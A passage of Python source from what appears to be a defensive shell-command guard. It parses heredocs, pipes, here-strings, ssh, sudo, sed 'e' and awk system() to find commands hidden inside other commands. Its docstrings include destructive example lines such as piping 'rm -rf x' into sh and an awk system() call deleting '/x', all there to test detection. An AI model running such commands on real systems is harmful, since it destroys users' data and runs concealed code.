            if depth == 0:
                return j
        return self.n

    def _skip_square(self, i: int) -> int:
        """Legacy ``$[…]`` arithmetic / a ``name[…]`` subscript: ``i`` is at the ``[``."""
        depth, j = 0, i
        while j < self.n:
            c = self.s[j]
            if c == "\\":
                j += 2
                continue
            depth += (c == "[") - (c == "]")
            j += 1
            if depth <= 0:
                return j
        return self.n

    def _skip_arith(self, i: int) -> int:
        """Arithmetic body: ``i`` is just past the opening ``((``; to the matching ``))``."""
        depth, j = 2, i
        while j < self.n:
            c = self.s[j]
            if c == "\\":
                j += 2
                continue
            depth += (c == "(") - (c == ")")
            j += 1
            if depth <= 0:
                return j
        return self.n

    def _double_quoted(self, i: int, depth: int) -> int:
        """``i`` is just past the opening ``"``; returns the index past the closing one."""
        s, n = self.s, self.n
        while i < n:
            c = s[i]
            if c == "\\":
                i += 2
            elif c == '"':
                return i + 1
            elif c == "$" and s.startswith("((", i + 1):
                i = self._skip_arith(i + 3)
            elif c == "$" and s.startswith("(", i + 1):
                i = self._commands(i + 2, ")", depth + 1)
            elif c == "$" and s.startswith("{", i + 1):
                i = self._skip_braces(i)
            elif c == "`":
                i = self._commands(i + 1, "`", depth + 1)
            else:
                i += 1
        return n

    # -- the walk --------------------------------------------------------
    def _commands(self, i: int, closer: str, depth: int, array: bool = False) -> int:
        """Walk command text from ``i`` to ``closer`` (``""`` = end); returns the index past it.

        ``array`` marks a ``name=( … )`` literal: bash cannot hold a heredoc there
        (a syntax error that bash 3.2 recovers from, running the next line), so a
        marker whose innermost scope is one is never a heredoc.
        """
        s, n = self.s, self.n
        if depth > _WALK_DEPTH:
            self.closed = False
            return n
        word_start, word, first, paren = True, [], None, 0
        opened = len(self.pending)
        while i < n:
            c = s[i]
            if c == "\\":
                # backslash-newline is a continuation: the lines join, so the
                # next character keeps the word-start state it would have had
                if s.startswith("\n", i + 1):
                    i += 2
                    continue
                i += 2
                word_start = False
                continue
            if c == "'":
                i = self._skip_single(i)
                word_start = False
                continue
            if c == '"':
                i = self._double_quoted(i + 1, depth)
                word_start = False
                continue
            if c == "$":
                nxt = s[i + 1 : i + 2]
                if s.startswith("((", i + 1):
                    i = self._skip_arith(i + 3)
                elif nxt == "(":
                    i = self._commands(i + 2, ")", depth + 1)
                elif nxt == "{":
                    i = self._skip_braces(i)
                elif nxt == "[":
                    i = self._skip_square(i + 1)
                elif nxt == "'":
                    i = self._skip_ansi_c(i)
                elif nxt == '"':
                    i += 1
                    continue
                elif nxt in _SPECIAL_PARAMS:
                    i += 2
                else:
                    i += 1
                word_start = False
                continue
            if c == "`":
                if closer == "`":
                    del self.pending[opened:]
                    self.closed = True
                    return i + 1
                i = self._commands(i + 1, "`", depth + 1)
                word_start = False
                continue
            if c == "#" and word_start:
                j = s.find("\n", i)
                i = n if j == -1 else j
                continue
            if c == "(" and s.startswith("((", i) and first is None and word_start:
                i = self._skip_arith(i + 2)
                word_start = False
                continue
            if c == "[" and _IDENT.fullmatch("".join(word)):
                i = self._skip_square(i)  # ``a[1<<2]=x``: the subscript is arithmetic
                word.append("[]")
                word_start = False
                continue
            if c == "[" and s.startswith("[[", i) and first is None and word_start:
                j = s.find("]]", i + 2)
                i = n if j == -1 else j + 2
                word_start = False
                first = "[["
                continue
            if c == "<" and s.startswith("<<", i) and array:
                self.poisoned = True
                i += 3 if s.startswith("<<<", i) else 2
                word_start = False
                continue
            if c == "<" and s.startswith("<<", i):
                if s.startswith("<<<", i):
                    i += 3
                    word_start = False
                    continue
                m = _HEREDOC_OPEN_RE.match(s, i)
                if m and (first == "let" or s.startswith("\\\n", m.end())):
                    m = None  # a ``let`` argument / a delimiter split by a continuation
                if m:
                    self.pending.append((i, m, closer != ""))
                    i = m.end()
                else:
                    i += 2
                word_start = False
                continue
            if c == "\n":
                if array or self.poisoned:
                    self.pending.clear()  # no body is read on a line bash rejects
                    self.poisoned = self.poisoned and array
                    i += 1
                    word_start, word, first, paren = True, [], None, 0
                    continue
                i = self._read_bodies(i)
                word_start, word, first, paren = True, [], None, 0
                continue
            if c == ")":
                if closer == ")" and paren == 0:
                    del self.pending[opened:]
                    self.closed = True
                    return i + 1
                paren = max(0, paren - 1)
            elif c == "(":
                if s[i - 1 : i] in _REPARSED_OPENERS:
                    # ``<(…)`` / ``>(…)`` / ``name=(…)`` re-parse their body as
                    # separate text: a marker inside closes with it
                    kept, literal = len(self.found), s[i - 1] == "="
                    i = self._commands(i + 1, ")", depth + 1, literal)
                    if literal and not self.closed:
                        self.poisoned = True  # an unclosed literal is a syntax error too
                    if literal and self.poisoned:
                        del self.found[kept:]
                    word_start = False
                    continue
                paren += 1
            if c in _SEGMENT_END:
                word_start, word, first = True, [], None
                i += 1
                continue
            if c in " \t":
                text = "".join(word)
                if text and first is None and text not in _COMMAND_PREFIX_WORDS:
                    first = text
                word, word_start = [], True
                i += 1
                continue
            word.append(c)
            word_start = c in _WORD_BREAK
            i += 1
        self.closed = False
        return n

    def _read_bodies(self, nl: int) -> int:
        """At the newline ending a line: read the bodies of the heredocs opened on it.

        A heredoc inside ``$(…)`` / backticks whose body has unbalanced parentheses
        is not hidden (see below). A marker whose ``$(…)`` / backtick span closes before the newline has no
        body there (bash runs the next line), so it is discarded at the closer.

        Returns where the walk resumes. A heredoc with no terminator line is
        dropped (and so is every later marker of that line) — bash would swallow
        the rest of the command as its body; we keep scanning it instead.
        """
        s, n = self.s, self.n
        cursor = nl + 1
        pending, self.pending = self.pending, []
        for start, mk, in_sub in pending:
            delim, literal = _heredoc_delimiter(mk.group("word"))
            body_end = term_end = None
            idx = cursor
            key = (delim, bool(mk.group("dash")))
            # a delimiter that found no terminator from an earlier cursor cannot
            # find one from a later one: stacked unterminated markers stay linear
            while idx <= n and key not in self.absent:
                eol = s.find("\n", idx)
                stop = n if eol == -1 else eol
                line = s[idx:stop]
                if (line.lstrip("\t") if mk.group("dash") else line) == delim:
                    body_end, term_end = idx, stop
                    break
                if eol == -1:
                    break
                idx = eol + 1
            if body_end is None:
                self.absent.add(key)
                break
            if in_sub and s.count("(", cursor, body_end) != s.count(")", cursor, body_end):
                # older bash matches a ``$(…)`` by counting parentheses and is blind
                # to heredocs: an unbalanced body can close the span early
                continue
            nl_before = s.rfind("\n", 0, start) + 1
            feed = _feeding_segment(s, start, mk.end(), nl)
            after = min(term_end + 1, n)
            closer = _CLOSER.match(s, after)
            opening = s[nl_before:start]
            if closer and "$(" not in opening and "`" not in opening:
                feed += " " + _until_break(closer.group(0).lstrip(" \t;"))
            self.found.append(_Heredoc(
                start, cursor, body_end, after, s[cursor:body_end].rstrip("\n"), literal, feed,
            ))
            cursor = after
        return cursor


@functools.lru_cache(maxsize=64)
def _heredocs(command: str) -> Tuple[_Heredoc, ...]:
    """Every real heredoc in ``command``, parsed the way bash reads them (#1106).

    Several markers on one line read their bodies in order (``cat <<A <<B``).
    The terminator is the delimiter ALONE on its line: ``<<`` takes no leading
    or trailing whitespace (`` EOF`` and ``EOF `` are body text), ``<<-`` strips
    leading TABS only. The delimiter is a full shell word (see above). A marker
    that bash would not read as a redirection (see ``_HeredocScanner``) opens no
    heredoc, so the lines after it stay visible to every rule.
    """
    return _HeredocScanner(command).run() if "<<" in command else ()


def _heredoc_bodies(command: str) -> List[Tuple[str, bool, str]]:
    """``(body, delimiter_quoted, opening_line)`` for every heredoc in ``command`` (#1098).

    A quoted delimiter makes the body literal; an unquoted one expands
    ``$(...)`` and backticks inside it.
    """
    return [(h.body, h.quoted, h.line) for h in _heredocs(command)]


def _hide_heredoc_bodies(command: str, keep_programs: bool) -> str:
    """``command`` with heredoc bodies replaced by one inert line.

    ``keep_programs`` keeps the bodies a shell or runner will EXECUTE (they are
    the program). Every other body is text to the rewriting passes — quoted or
    not: in an unquoted body only ``$(…)`` and backticks are code, and
    ``_heredoc_substitution_commands`` scans those on the full command.
    """
    out, pos = [], 0
    for h in _heredocs(command):
        if keep_programs and _stdin_is_program(_feed_words(h.line)):
            continue
        out.append(command[pos : h.body_start])
        out.append(_HEREDOC_BODY + "\n")
        pos = h.body_end
    out.append(command[pos:])
    return "".join(out)


def _command_substitutions(text: str) -> List[str]:
    """Bodies of the ``$(...)`` / backtick substitutions the shell would run in ``text``.

    A backslash-escaped opener is literal; ``$((`` is arithmetic. Parentheses
    are balanced so a nested ``$(a $(b))`` comes back whole (the rescan finds
    the inner one itself).
    """
    out: List[str] = []
    i, n = 0, len(text)
    while i < n:
        c = text[i]
        if c == "\\":
            i += 2
        elif c == "$" and text.startswith("(", i + 1) and not text.startswith("((", i + 1):
            depth, j = 1, i + 2
            while j < n and depth:
                depth += (text[j] == "(") - (text[j] == ")")
                j += 1
            out.append(text[i + 2 : j - 1 if depth == 0 else j])
            i = j
        elif c == "`":
            j = i + 1
            while j < n and text[j] != "`":
                j += 2 if text[j] == "\\" else 1
            out.append(text[i + 1 : j])
            i = j + 1
        else:
            i += 1
    return out


def _heredoc_substitution_commands(command: str) -> List[str]:
    """Commands an UNQUOTED heredoc body runs through ``$(...)`` / backticks (#1098).

    The masked ladder strips heredoc bodies as content, which is right for prose
    and wrong for a body the shell EXPANDS: ``cat <<EOF`` / ``$(touch <path>)``
    runs the touch. Each substitution is returned as a command in its own right
    (the verb decides, as in a double-quoted string); a quoted-delimiter body is
    data and contributes nothing.
    """
    if "<<" not in command:
        return []
    out: List[str] = []
    for body, quoted, _line in _heredoc_bodies(command):
        if not quoted:
            out.extend(_command_substitutions(body))
    return out


_STDIN_PROGRAM_FILES = frozenset({"/dev/stdin", "/dev/fd/0", "/proc/self/fd/0", "-"})
# ssh options that take a separate value (so the value is not mistaken for the host)
_SSH_VALUE_OPTS = frozenset(
    "-b -c -D -E -e -F -I -i -J -L -l -m -O -o -p -Q -R -S -W -w".split()
)
# GNU parallel options that take a separate value
_PARALLEL_VALUE_OPTS = frozenset(
    "-j --jobs -a --arg-file -S --sshlogin -n --max-args -N -L --max-lines -d "
    "--delimiter --colsep -C -I -J --results --joblog -E --timeout --retries "
    "--delay --halt --load --memfree --nice --tmpdir --workdir --sshloginfile "
    "--slf --trc --return --transfer-file --basefile --env -s".split()
)
_PARALLEL_SEPARATORS = frozenset({":::", "::::", ":::+", "::::+"})
_PARALLEL_REPLACEMENT = _rx(r"\{(?:\.|/|//|/\.|#)?\}")


_REDIRECT_RE = _rx(
    r"\d*(?:<<<|<<-?|<>|>>|>\||>&|&>|<|>)[ \t]*(?:'[^']*'|\"[^\"]*\"|\\.|[^\s|;&()'\"\\])+"
)
_WORD_OPERATORS = frozenset({"|", "|&", "||", "&", "&&", ";"})


def _words(text: str) -> List[str]:
    try:
        return shlex.split(text, comments=True)
    except ValueError:
        return text.split()


_OPERATOR_ONLY = _rx(r"[;&|<>()]+")
_OPERATOR_TOKEN = _rx(r"&&|\|\||\|&|[;&|<>()]")


def _command_words(line: str) -> List[str]:
    """Words of a command line with redirections removed (``ssh host <<EOF`` -> ``ssh host``).

    Operators are words of their own, with or without spaces (``|sh`` -> ``|``, ``sh``).
    """
    text = _REDIRECT_RE.sub(" ", line)
    try:
        lex = shlex.shlex(text, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        lex.commenters = "#"
        words: List[str] = []
        for w in lex:  # shlex fuses neighbouring operators (``)|``): one word per operator
            words.extend(_OPERATOR_TOKEN.findall(w) if _OPERATOR_ONLY.fullmatch(w) else [w])
        return words
    except ValueError:
        return text.split()


def _feed_words(line: str) -> List[str]:
    """:func:`_command_words` of a command that is handed stdin, past compound openers
    and a group's closing paren/brace (``if x; then ssh host <<EOF``, ``(ssh host <<EOF``)."""
    return [w for w in strip_command_opener_words(_command_words(line)) if w not in (")", "}")]


def _ssh_remote_command(args: List[str]) -> List[str]:
    """The remote command words of an ``ssh`` invocation (empty = interactive shell)."""
    i = 0
    while i < len(args) and args[i].startswith("-"):
        i += 1 if args[i] == "--" else 2 if args[i] in _SSH_VALUE_OPTS else 1
    return args[i + 1 :]  # args[i] is the host


def _parallel_command(args: List[str]) -> Tuple[List[str], Optional[str]]:
    """``(command_words, replacement_string)`` of a GNU ``parallel`` invocation."""
    i, repl = 0, None
    while i < len(args):
        w = args[i]
        if w in (":::", "::::", ":::+", "::::+"):
            return [], repl
        if w == "-I" and i + 1 < len(args):
            repl = args[i + 1]
        if w.startswith("-") and w != "-":
            i += 2 if w in _PARALLEL_VALUE_OPTS else 1
            continue
        cmd: List[str] = []
        while i < len(args) and args[i] not in (":::", "::::", ":::+", "::::+"):
            cmd.append(args[i])
            i += 1
        return cmd, repl
    return [], repl


# Programs that read a script from stdin: shells and the common interpreters.
_STDIN_READERS = frozenset({
    "sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "csh", "tcsh",
    "perl", "python", "python2", "python3", "node", "ruby", "php", "deno", "bun",
})
# Embedded-language interpreters (#18) read a program from stdin only when they were handed no
# program of their own: ``lua -e 'print(1)'`` and ``lua script.lua`` take stdin as DATA.
_BARE_STDIN_READERS = frozenset({
    "lua", "luajit", "tclsh", "wish", "R", "Rscript", "julia", "groovy", "osascript", "expect",
})
_CONTAINER_RUNNERS = frozenset({"docker", "podman", "kubectl", "nerdctl", "lxc", "incus"})


def _reads_stdin_script(args: List[str]) -> bool:
    """An embedded-language interpreter with no inline flag and no script operand runs stdin."""
    return all(a.startswith("-") and not re.fullmatch(r"-[A-Za-z]*[eEc]", a) and not a.startswith("--eval") for a in args)


def _stage_reads_program(stage: List[str]) -> bool:
    """True when one simple command (``sudo sh``, ``exec bash``, ``busybox sh -s``) executes its stdin.

    The ONE predicate for "this command's stdin is a program", shared by the
    pipe, heredoc and here-string feeds and by the ssh remote command: the
    same payload is refused or allowed however it arrives (#1099 review).
    """
    words = [w for w in stage if w not in ("(", ")") and not _ASSIGN_WORD.match(w)]
    while words and words[0] == "--":
        words = words[1:]
    if not words:
        return False
    head = os.path.basename(words[0])
    if head in _STDIN_READERS:
        return True
    if head in _BARE_STDIN_READERS:
        return _reads_stdin_script(words[1:])
    if head in ("sudo", "doas"):
        i = 1  # sudo's own options only: ``sudo ls -i`` is ls's flag, not a login shell
        while i < len(words) and words[i].startswith("-"):
            if re.fullmatch(r"-(?!-)[A-Za-z]*[si][A-Za-z]*|--(?:shell|login)", words[i]):
                return True  # ``sudo -s`` / ``sudo -i`` ARE shells
            i += 2 if words[i] in ("-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U") else 1
    if head in _PREFIX_WRAPPERS or head in ("busybox", "builtin", "pkexec"):
        for k, w in enumerate(words[1:5], 1):
            if os.path.basename(w) in _BARE_STDIN_READERS and _reads_stdin_script(words[k + 1 :]):
                return True
        return any(os.path.basename(w) in _STDIN_READERS | {"su"} for w in words[1:5])
    if head == "su":  # no -c: su starts a login shell that reads its stdin
        return "-c" not in words and "--command" not in words
    if head in _CONTAINER_RUNNERS:
        return any(os.path.basename(w) in _STDIN_READERS for w in words[1:])
    return False


def _xargs_stdin_is_program(args: List[str]) -> bool:
    """``xargs -I{} sh -c '{} …'``: each input line is substituted in as the shell's program (#19)."""
    repl: Optional[str] = None
    i = 0
    while i < len(args) and args[i].startswith("-"):
        w = args[i]
        if w in ("-I", "-J") and i + 1 < len(args):
            repl = args[i + 1]
            i += 1
        elif w.startswith(("-I", "-J")) and len(w) > 2:
            repl = w[2:]
        elif w == "--replace" or w.startswith("--replace="):
            repl = w.partition("=")[2] or "{}"
        elif w in ("-L", "-n", "-P", "-s", "-d", "-E", "-a"):
            i += 1
        i += 1
    cmd = args[i:]
    if not repl or not cmd or os.path.basename(cmd[0]) not in _SHELL_NAMES - {"su"}:
        return False
    return any(re.fullmatch(r"-[A-Za-z]*c", w) for w in cmd[1:]) and any(
        w.lstrip().startswith(repl) for w in cmd[1:] if not w.startswith("-")
    )


def _stdin_is_program(words: List[str]) -> bool:
    """True when this simple command runs what it reads on stdin as commands (#1099).

    ``ssh host`` (no remote command, or a remote command that itself reads a
    program: a shell/interpreter behind ``sudo``/``exec``/``--``/``-s``)
    executes its stdin remotely, ``at``/``batch`` queue it, ``. /dev/stdin``
    sources it, a bare ``parallel`` (or one running a shell) runs each line,
    and ``sudo sh`` / ``su -`` / ``docker exec -i c sh`` read it directly.
    With a real remote program (``ssh host cat``) stdin is data and the text is
    not a command.
    """
    stage: List[str] = []
    for w in words + ["|"]:
        if w in _WORD_OPERATORS:
            if _stage_reads_program(stage):
                return True
            stage = []
        else:
            stage.append(w)
    for i, w in enumerate(words):
        name, rest = os.path.basename(w), words[i + 1 :]
        for j, r in enumerate(rest):
            if r in _WORD_OPERATORS:
                rest = rest[:j]
                break
        if name in ("at", "batch"):
            return True
        if name in ("source", "."):
            if rest and rest[0] in _STDIN_PROGRAM_FILES:
                return True
        elif name == "crontab":
            if "-" in rest:
                return True
        elif name in ("ssh", "slogin", "mosh"):
            remote = _words(" ".join(_ssh_remote_command(rest)))
            while remote and remote[0] == "--":
                remote = remote[1:]
            if not remote or _stage_reads_program(remote):
                return True
        elif name == "parallel":
            cmd = _parallel_command(rest)[0]
            if not cmd or _stage_reads_program(cmd):
                return True
        elif name == "xargs" and _xargs_stdin_is_program(rest):
            return True
    return False


def _pipe_stages(command: str) -> List[Tuple[str, str]]:
    """``(operator_before, stage_text)`` pairs, split outside quotes on ``| ; & newline``."""
    stages: List[Tuple[str, str]] = []
    buf: List[str] = []
    op, quote, i, n = "", "", 0, len(command)
    while i < n:
        c = command[i]
        if quote:
            buf.append(c)
            if c == "\\" and quote == '"' and i + 1 < n:
                buf.append(command[i + 1])
                i += 1
            elif c == quote:
                quote = ""
        elif c in "'\"":
            quote = c
            buf.append(c)
        elif c == "#" and (not buf or buf[-1][-1:].isspace()):
            while i + 1 < n and command[i + 1] != "\n":  # a comment runs to end of line
                i += 1
        elif c == "\\" and i + 1 < n:
            buf.append(c + command[i + 1])
            i += 1
        elif c in "|;&\n":
            nxt = command[i + 1] if i + 1 < n else ""
            prev = buf[-1][-1:] if buf else ""
            if (c in "|&" and prev in (">", "<")) or (c == "&" and nxt == ">"):
                buf.append(c)  # ``>|`` / ``>&`` / ``&>`` are redirects, not separators
            else:
                this = c + nxt if (nxt == c and c in "|&") or (c == "|" and nxt == "&") else c
                stages.append((op, "".join(buf)))
                buf, op = [], ("|" if this == "|&" else this)  # ``|&`` is a pipe
                i += len(this) - 1
        else:
            buf.append(c)
        i += 1
    stages.append((op, "".join(buf)))
    return stages


_HERE_STRING_RE = _rx(r"<<<[ \t]*('[^']*'|\"[^\"]*\"|\S+)")


def _here_strings(text: str):
    """Real ``<<<`` redirections of ``text`` (matches outside quotes).

    A quoted ``<<<`` is skipped by resuming just past its three characters: the regex
    would otherwise consume the NEXT, real ``<<<`` as the quoted one's argument
    (``echo '<<<'; sh <<< 'rm -rf x'``).
    """
    pos = 0
    while True:
        m = _HERE_STRING_RE.search(text, pos)
        if m is None:
            return
        if _inside_quotes(text, m.start()):
            pos = m.start() + 3
            continue
        yield m
        pos = m.end()


_CRON_FIELDS = _rx(r"^[ \t]*(?:@\w+|(?:\S+[ \t]+){5})")


def _program_text(text: str, consumer_words: List[str]) -> str:
    """The commands in ``text`` as its consumer will run them (a crontab line is ``<5 fields> command``)."""
    if any(os.path.basename(w) == "crontab" for w in consumer_words):
        return "\n".join(
            _CRON_FIELDS.sub("", ln) for ln in text.split("\n") if not ln.lstrip().startswith("#")
        )
    return text


_REMOTE_SHELLS = frozenset({"ssh", "slogin", "mosh"})


def _inside_quotes(text: str, pos: int) -> bool:
    """Whether offset ``pos`` sits inside a quoted span of ``text`` (single, double, backslash-aware)."""
    quote, i = "", 0
    while i < pos:
        ch = text[i]
        if quote:
            if ch == "\\" and quote == '"':
                i += 1
            elif ch == quote:
                quote = ""
        elif ch == "\\":
            i += 1
        elif ch in "'\"":
            quote = ch
        i += 1
    return bool(quote)


def _as_inline_program(text: str, consumer_words: List[str]) -> List[str]:
    """``text`` as the inline program (``lua -e '…'``) of an interpreter that reads it on stdin (#18).

    A body piped to ``ssh host python3`` is Python, not shell: the shell reading
    of it (``_program_text``) cannot see ``open(path, 'w')``, but the same text
    as ``python3 -c '…'`` meets every inline-program net exactly as typed.
    """
    if not any(os.path.basename(w) in _REMOTE_SHELLS for w in consumer_words):
        return []
    for k, w in enumerate(consumer_words):
        name = os.path.basename(w)
        flags = _EXEC_SURFACES.get(name)
        if flags and (name in _STDIN_READERS or name in _BARE_STDIN_READERS) and (
            name in _STDIN_READERS or _reads_stdin_script(consumer_words[k + 1 :])
        ):
            return [f"{name} {min(flags, key=lambda f: (len(f), f))} {shlex.quote(text)}"]
    return []


def _sftp_batch_commands(text: str, consumer_words: List[str]) -> List[str]:
    """The ``get`` / ``!`` lines of an sftp batch read on stdin, as the commands they perform (#17)."""
    if not any(os.path.basename(w) == "sftp" for w in consumer_words):
        return []
    out: List[str] = []
    lcd = ""
    for line in _eval_unescape(text).split("\n"):
        parts = _words(line)
        if not parts:
            continue
        verb, args = parts[0], [a for a in parts[1:] if not a.startswith("-")]
        if line.lstrip().startswith("!"):
            out.append(line.lstrip()[1:])
        elif verb == "lcd" and args:
            lcd = args[0]
        elif verb in ("get", "reget") and args:
            local = args[1] if len(args) > 1 else os.path.basename(args[0])
            if lcd and not os.path.isabs(local):
                local = f"{lcd}/{local}"
            out.append(f"sftp host:{_quote_word(args[0])} {_quote_word(local)}")
    return out


def _producer_commands(producer: str) -> List[List[str]]:
    """Word lists of the commands a pipe stage's text may end in, past openers and prefix wrappers.

    ``if t; then sudo cat <<< X`` feeds the pipe from ``cat``: each tail after a segment break
    is stripped of compound openers, then of ``sudo``/``env``/``nohup``/``timeout N``.
    """
    words = _words(producer)
    tails = [words] + [words[i + 1 :] for i, w in enumerate(words) if w in ("&&", "||", "&") or w.endswith(";")]
    out: List[List[str]] = []
    for tail in tails:
        tail = strip_command_opener_words(tail)
        k = _wrapped_command_index(tail) if tail else None
        if k is not None:
            tail = tail[k:]
        if tail:
            out.append(tail)
    return out


def _stdin_program_commands(command: str, rules: bool = False) -> List[str]:
    """Text that a stdin-reading runner will execute as commands (#1099).

    The wrapped command is the command: the heredoc body, here-string or piped
    ``echo``/``printf`` text handed to ``ssh host``, ``at``, ``. /dev/stdin`` …
    is re-scanned as a command in its own right, so the verb decides exactly as
    it would unwrapped. Text produced by anything else (``cat file |``) is not
    statically visible — a declared residual.
    """
    out: List[str] = []

    def emit(text: str, words: List[str]) -> None:
        # ``rules``: the general rule scan reads shell text as shell only for a SHELL consumer;
        # an interpreter's stdin is its own language (``python3 - <<< 'eval'`` runs no eval).
        if _stdin_is_program(words):
            if not rules or _eval_shell_consumer(words):
                out.append(_program_text(text, words))
            out.extend(_as_inline_program(text, words))
        out.extend(_sftp_batch_commands(text, words))

    if "<<" in command:
        for body, _quoted, line in _heredoc_bodies(command):
            words = _feed_words(line)
            emit(body, words)
        visible = _hide_heredoc_bodies(command, keep_programs=True)
        for m in _here_strings(visible):  # ``'lua <<< x'`` in a message body is text
            line = visible[visible.rfind("\n", 0, m.start()) + 1 : m.start()]
            cut = [b.end() for b in _SEGMENT_BREAK.finditer(line)]  # ``then sh <<< X``: the command after the last break
            words = _feed_words(line[cut[-1] :] if cut else line)
            emit(" ".join(_words(m.group(1))), words)
    if "|" in command:
        stages = _pipe_stages(_hide_heredoc_bodies(command, keep_programs=False))
        for (_, producer), (op, consumer) in zip(stages, stages[1:]):
            consumer_words = _feed_words(consumer)
            if op != "|":
                continue
            for words in _producer_commands(producer):
                if os.path.basename(words[0]) in ("echo", "printf"):
                    text = " ".join(w for w in words[1:] if not re.fullmatch(r"-[neE]+", w))
                    emit(text, consumer_words)
                    if os.path.basename(words[0]) == "printf" and len(words) > 2 and "%" in words[1]:
                        emit(" ".join(words[2:]), consumer_words)  # ``printf '%s' X``: X is the text
                elif os.path.basename(words[0]) == "cat" and "<<<" in words[1:-1]:
                    emit(words[words.index("<<<") + 1], consumer_words)  # ``cat <<< X | sh``
    return out


#
# HIDDEN COMMANDS: text another program will RUN (#7 #8 #9 #13 #17 #18 #19)
#
# A command can carry a second command that the shell never parses: a
# process-substitution body, a heredoc/here-string handed to a shell, the value
# of an option the tool executes (``tar --to-command``, ``git fetch
# --upload-pack``), or an embedded program (``sed 'e …'``, ``awk system(…)``).
# ONE rule covers them all: the hidden text is judged as a command in its own
# right, by the SAME engine that judges it top-level (``_decide_command``
# recurses; ``_check_protected_command`` recurses through ``_derived_commands``).
# So a payload's decision inside a wrapper equals its decision alone — by
# construction, with no per-rule twin — and a verb rule needs no knowledge of
# the wrappers that can carry it.
#
# What stays out: text another PROGRAM produces (``cat x.sh | sh``, a Makefile
# recipe, a file named by ``-f``) is not statically visible; those fail closed
# or are declared residuals (see the wiki), never guessed at.


def _procsub_bodies(command: str) -> List[str]:
    """Bodies of ``<(…)`` / ``>(…)``: the shell RUNS each one, whatever consumes the pipe."""
    if "<(" not in command and ">(" not in command:
        return []
    text = _hide_heredoc_bodies(command, keep_programs=False) if "<<" in command else command
    out: List[str] = []
    n, i, quote = len(text), 0, ""
    while i < n:
        c = text[i]
        if quote:
            if c == "\\" and quote == '"':
                i += 1
            elif c == quote:
                quote = ""
        elif c == "\\":
            i += 1
        elif c in "'\"":
            quote = c
        elif c in "<>" and text.startswith("(", i + 1) and (i == 0 or text[i - 1] not in "<>$"):
            j, depth, q = i + 2, 1, ""
            while j < n and depth:
                d = text[j]
                if q:
                    if d == "\\" and q == '"':
                        j += 1
                    elif d == q:
                        q = ""
                elif d == "\\":
                    j += 1
                elif d in "'\"":
                    q = d
                elif d == "(":
                    depth += 1
                elif d == ")":
                    depth -= 1
                j += 1
            out.append(text[i + 2 : j - 1 if depth == 0 else j])
            i = j
            continue
        i += 1
    return out


def _segment_raw_words(command: str) -> List[List[str]]:
    """Each simple command's resolved words, quoted content intact (what the masked walk blanks)."""
    command = _strip_heredoc_bodies(command)
    assigns = {m.group(1): m.group(2).strip("'\"") for m in _ASSIGN_RE.finditer(command)}
    out: List[List[str]] = []
    for toks in _scan_masked_tokens(command):
        words: List[str] = []
        for text, _fq, _ex in strip_command_openers([(t.replace(_DATA_PAREN, ")"), fq, ex) for t, fq, ex in toks]):
            for name, val in assigns.items():
                text = text.replace("${%s}" % name, val).replace("$" + name, val)
            words.append(text)
        if words:
            out.append(words)
    return out


def _option_values(
    args: List[str], longs: Tuple[str, ...] = (), shorts: Tuple[str, ...] = ()
) -> List[str]:
    """Values of ``--long=V`` / ``--long V`` / ``-s V`` / ``-sV`` options, up to a bare ``--``."""
    out: List[str] = []
    i = 0
    while i < len(args):
        w = args[i]
        if w == "--":
            break
        value: Optional[str] = None
        for name in longs:
            if w == name:
                value = args[i + 1] if i + 1 < len(args) else None
                i += 1
                break
            if w.startswith(name + "="):
                value = w[len(name) + 1 :]
                break
        else:
            for flag in shorts:
                if w == flag:
                    value = args[i + 1] if i + 1 < len(args) else None
                    i += 1
                    break
                if w.startswith(flag) and not w.startswith("--") and len(w) > len(flag):
                    value = w[len(flag) :]
                    break
        if value:
            out.append(value)
        i += 1
    return out


_SED_ADDR = r"(?:\d+|\$|/(?:\\.|[^/\\\n])*/[IM]*|\\(?P<d>[^\w\s\\])(?:(?!(?P=d)).)*(?P=d)[IM]*)"
_SED_E_CMD_RE = _rx(
    r"(?:^|[;{}\n])[ \t]*(?:" + _SED_ADDR + r"(?:[ \t]*[,~][ \t]*(?:\d+|\$|/(?:\\.|[^/\\\n])*/[IM]*))?)?"
    r"[ \t]*!?[ \t]*e[ \t]+(?P<cmd>[^\n]*)",
    0,
)
_SED_S_FLAG_E_RE = _rx(
    r"(?:^|[;{}\n])[ \t]*(?:[0-9$,~]+|/(?:\\.|[^/\\\n])*/)?[ \t]*!?[ \t]*"
    r"s([^\w\s\\]|_)(?:\\.|(?!\1)[^\\])*\1((?:\\.|(?!\1)[^\\])*)\1[a-zA-Z0-9]*e",
    0,
)


def _sed_payloads(args: List[str]) -> List[str]:
    """Commands a sed script RUNS: the ``e command`` command and the ``s///e`` flag.

    The replacement of ``s/x/<cmd>/e`` is the text executed once substituted,
    so its literal is scanned as the command. A script that feeds the pattern
    space to ``e`` with no operand runs input data — undecidable, declared.
    """
    scripts = _option_values(args, ("--expression",), ("-e",))
    for i, w in enumerate(args):  # ``-ne 'p'``: a cluster ending in e takes the next word
        if re.fullmatch(r"-[A-Za-z]*e", w) and w != "-e" and i + 1 < len(args):
            scripts.append(args[i + 1])
    if not scripts and not any(a in ("-f", "--file") or a.startswith("--file=") for a in args):
        scripts = [w for w in args if not w.startswith("-")][:1]
    out: List[str] = []
    for script in scripts:
        for m in _SED_E_CMD_RE.finditer(script):
            out.append(m.group("cmd"))
        for m in _SED_S_FLAG_E_RE.finditer(script):
            out.append(m.group(2))
    return out


_AWK_STRING_RE = _rx(r'"((?:[^"\\]|\\.)*)"', 0)
_AWK_EXEC_RE = _rx(r"\bsystem\s*\(|\bgetline\b|(?<!\|)\|(?!\|)", 0)
_AWK_UNESCAPE_RE = _rx(r'\\(["\\/])', 0)


def _awk_payloads(args: List[str]) -> List[str]:
    """String literals of an awk program that shells out (``system(…)``, ``| getline``, ``print | "cmd"``).

    Every literal is judged as a command, and so is their concatenation
    (``system("rm -rf " "/x")``). A program with no literal at all
    (``system($0)``) runs data — undecidable, declared.
    """
    out: List[str] = []
    for prog in args:
        if prog.startswith("-") or not _AWK_EXEC_RE.search(prog):
            continue
        lits = [_AWK_UNESCAPE_RE.sub(r"\1", m.group(1)) for m in _AWK_STRING_RE.finditer(prog)]
        out.extend(lits)
        if len(lits) > 1:
            out.append("".join(lits))
    return out


_TAR_EXEC_LONGS = (
    "--to-command", "--use-compress-program", "--use-compress-prog", "--info-script",
    "--new-volume-script", "--rsh-command", "--rmt-command",
)


def _tar_payloads(args: List[str]) -> List[str]:
